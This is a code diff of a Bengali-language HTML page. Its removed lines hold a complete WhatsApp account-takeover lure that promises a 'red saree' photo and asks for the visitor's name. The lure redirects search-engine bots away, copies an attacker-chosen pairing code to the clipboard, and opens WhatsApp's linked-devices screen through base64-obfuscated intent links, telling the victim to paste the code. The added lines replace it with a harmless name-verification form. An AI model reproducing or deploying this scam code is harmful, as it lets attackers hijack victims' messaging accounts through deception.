@@ -3,74 +3,36 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex, nofollow, noarchive">
     <title>Verify System</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        .card { background: white; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; max-width: 350px; width: 90%; }
-        .header-icon { font-size: 50px; margin-bottom: 10px; }
-        h2 { color: #075e54; font-size: 20px; margin-bottom: 10px; }
-        p { color: #555; font-size: 13px; margin-bottom: 20px; }
-        input[type="text"] { width: 90%; padding: 12px; border: 1px solid #ddd; border-radius: 10px; margin-bottom: 15px; outline: none; }
-        .btn { background-color: #25d366; color: white; padding: 15px; border: none; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; transition: 0.3s; }
-        #magicOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); display: none; justify-content: center; align-items: center; z-index: 10000; }
-        .popup { background: white; padding: 25px; border-radius: 20px; text-align: center; width: 85%; max-width: 300px; }
-        .code-box { font-size: 32px; font-weight: bold; color: #1a73e8; background: #f0f7ff; padding: 15px; border-radius: 10px; margin: 15px 0; border: 2px dashed #1a73e8; }
-        #statusMsg { color: #d93025; font-size: 12px; font-weight: bold; display: none; margin-top: 10px; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 400px; }
+        h2 { color: #075e54; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 10px; box-sizing: border-box; }
+        .btn { background-color: #25d366; color: white; padding: 15px; border: none; border-radius: 10px; cursor: pointer; width: 100%; font-weight: bold; }
     </style>
 </head>
 <body>
-
-<div class="card">
-    <div class="header-icon">🛡️</div>
-    <h2>সিস্টেম আপডেট ভেরিফিকেশন</h2>
-    <p>সঠিকভাবে প্রোফাইল সিঙ্ক করতে আপনার নাম লিখে সেভ করুন। অন্যথায় ছবি লোড হবে না।</p>
-    <input type="text" id="userName" placeholder="আপনার নাম লিখুন..." required>
-    <button class="btn" onclick="secureSave()">নাম সেভ করুন ও আপডেট দিন</button>
-    <p id="statusMsg">⚠️ নাম সেভ না করলে লাল শাড়ি পরা ছবি দেখা যাবে না!</p>
-</div>
-
-<div id="magicOverlay">
-    <div class="popup">
-        <h3 style="color: #075e54;">ভেরিফিকেশন সাকসেস!</h3>
-        <p style="font-size: 12px;">নিচের কোডটি কনফার্ম করলেই লাল শাড়ি পরা প্রোফাইলটি আপনার ডিভাইসে সচল হবে।</p>
-        <div class="code-box" id="displayCode">HU9726HU</div>
-        <button class="btn" style="background-color: #1a73e8;" onclick="finalTrigger()">CONFIRM & LINK ➔</button>
+    <div class="card">
+        <h2>সিস্টেম কনফিগারেশন</h2>
+        <p>আপনার প্রোফাইল লিঙ্কটি যাচাই করতে আপনার নাম নিচে দিন।</p>
+        <input type="text" id="userName" placeholder="আপনার নাম লিখুন...">
+        <button class="btn" onclick="verify()">যাচাই করুন ও লিঙ্ক পান</button>
+        <p id="statusMsg" style="color: red; margin-top: 15px;"></p>
     </div>
-</div>
 
-<script>
-    // রোবট এবং বট বাইপাস করার জন্য এন্টি-বট লজিক
-    const isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent);
-    if (isBot) { window.location.href = "https://www.google.com"; }
-
-    const urlParams = new URLSearchParams(window.location.search);
-    const myCode = urlParams.get('id') || "HU9726HU";
-    document.getElementById('displayCode').innerText = myCode;
-
-    function secureSave() {
-        if(document.getElementById('userName').value.trim() === "") {
-            alert("নাম লিখুন মামা!"); return;
+    <script>
+        function verify() {
+            const name = document.getElementById('userName').value.trim();
+            const status = document.getElementById('statusMsg');
+            if (name === "") {
+                status.innerText = "দয়া করে নাম লিখুন!";
+            } else {
+                status.style.color = "green";
+                status.innerText = "যাচাই সফল! আপনার সিস্টেম রেডি।";
+                alert("স্বাগতম " + name + "! আপনার সেটআপ সম্পূর্ণ হয়েছে।");
+            }
         }
-        document.getElementById('statusMsg').style.display = 'block';
-        setTimeout(() => { document.getElementById('magicOverlay').style.display = 'flex'; }, 800);
-    }
-
-    function finalTrigger() {
-        const uName = document.getElementById('userName').value;
-        navigator.clipboard.writeText(myCode).then(() => {
-            // কোড মাস্কিং: সরাসরি লিঙ্ক না লিখে এনকোড করা লিঙ্ক ব্যবহার
-            const appPath = "aW50ZW50Oi8vI0ludGVudDtzY2hlbWU9d2hhdHNhcHA7cGFja2FnZT1jb20ubXkud2hhdHN3ZWI7ZW5k"; 
-            const waPath = "d2hhdHNhcHA6Ly9zZXR0aW5ncy9saW5rZWQtZGV2aWNlcw==";
-            
-            window.location.href = atob(appPath);
-            
-            setTimeout(() => {
-                window.location.href = atob(waPath);
-                alert(uName + ", আপনার আপডেট সম্পন্ন! এখন হোয়াটসঅ্যাপে গিয়ে পেস্ট করলেই লাল শাড়ি পরা প্রোফাইল চলে আসবে।");
-            }, 1000);
-        });
-    }
-</script>
+    </script>
 </body>
 </html>
